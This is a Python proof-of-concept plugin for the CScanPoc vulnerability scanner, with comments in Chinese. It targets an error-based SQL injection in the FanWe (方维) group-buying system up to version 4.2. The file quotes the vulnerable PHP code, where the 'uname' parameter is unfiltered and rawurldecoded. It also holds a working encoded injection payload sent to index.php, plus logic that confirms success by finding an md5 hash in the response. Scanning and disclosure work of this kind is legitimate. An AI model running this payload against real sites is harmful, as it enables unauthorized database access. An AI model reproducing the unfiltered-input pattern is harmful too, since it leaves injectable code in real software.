# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'FanWe_0012'  # 平台漏洞编号，留空
    name = '方维团购系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-04-02'  # 漏洞公布时间
    desc = '''
        这个漏洞也在几个低版本中一直存在！
        漏洞文件：app/source/article_show.php
        [php] if ($_REQUEST ['m'] == 'Article' && $_REQUEST ['a'] == 'showByUname') {
        $uname = $_REQUEST['uname']; //无过滤
        if($uname!='')
        {
        $uname = rawurldecode($uname);// 不受GPC影响
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1475/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FanWe(方维)'  # 漏洞应用名称
    product_version = '<= 4.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aa4b19c2-5124-446c-a695-5cbcee9033e6'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-19'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/index.php?m=Article&a=showByUname&uname=%2527or%201=%28select%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28select%20md5%28c%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%2523"
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and "4a8a08f09d37b73795649038408b5f33" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
